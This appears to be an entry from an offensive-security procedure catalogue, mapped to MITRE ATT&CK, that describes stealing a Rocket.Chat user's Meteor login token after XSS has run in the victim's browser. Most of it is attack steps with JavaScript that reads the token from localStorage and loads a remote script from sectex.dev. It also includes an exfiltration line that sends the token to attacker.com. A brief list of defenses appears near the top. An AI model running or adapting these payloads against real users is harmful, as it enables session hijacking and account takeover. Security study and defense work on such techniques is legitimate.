---
tags:
  - token-theft
  - exfiltration
type: procedure
tools: []
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/rocket-chat-steal-token-js]]'
  - '[[commands/rocket-chat-load-external-script]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Web Session Cookie]]'
updated_at: '2025-12-14T17:33:24.256Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 09aab13b-2970-4ea2-9c42-4fc94c323e2c
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Steal Web Session Cookie]]'
---
# Steal-Victims-Login-Token

## Summary

This procedure uses the XSS context to access and exfiltrate the victim's Meteor login token from localStorage, enabling session hijacking. It can load external scripts for automated theft and transmission to the attacker.

## Description

In the victim's browser, the executed JS accesses localStorage.getItem('Meteor.loginToken') or document.cookie to retrieve the token used for WebSocket authentication in Rocket.Chat (Meteor framework). The token is then exfiltrated via fetch to an attacker server, img src beacon, or by loading a remote script that performs the theft. This leads to full account access without passwords. Prerequisites: Active XSS execution; attacker-controlled server for receiving data.

## Requirements

1. XSS already triggered in victim browser
2. Attacker domain for exfiltration (e.g., sectex.dev)
3. Victim logged in with valid token

## Defense

Defensive measures and detection strategies:

- Store tokens in HttpOnly cookies instead of localStorage
- Implement token binding to user-agent or IP
- Monitor for cross-origin requests from chat pages
- Use short-lived tokens with rotation

## Objectives

1. Retrieve login token from storage
2. Exfiltrate to attacker control
3. Enable subsequent authentication

## Instructions

### Step 1: Access Token in JS

**Context**: Use DOM access to grab the token.

**Command** ([[commands/rocket-chat-steal-token-js]]):
```javascript
let token = localStorage.getItem('Meteor.loginToken');
// Or: document.cookie for alternatives
console.log(token); // For testing
```

> Expected: Token string like 'abc123...' output in console.

### Step 2: Exfiltrate via External Script

**Context**: Load a remote JS to handle theft and send.

**Command** ([[commands/rocket-chat-load-external-script]]):
```javascript
let s = document.createElement('script');
s.src = 'https://sectex.dev/files/cswsh.js';
document.body.appendChild(s);
```

> The script (cswsh.js) would contain: fetch('https://attacker.com/steal?token=' + token);

### Step 3: Verify Exfiltration

**Context**: Check attacker server logs for received token.

No command; monitor incoming requests.

> Expected: POST/GET with token parameter.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Steal Web Session Cookie]] Steal Web Session Cookie

### Sub-Techniques


## Commands Used

- [[commands/rocket-chat-steal-token-js]]
- [[commands/rocket-chat-load-external-script]]

## Tools Used


## Tags

- token-theft
- exfiltration
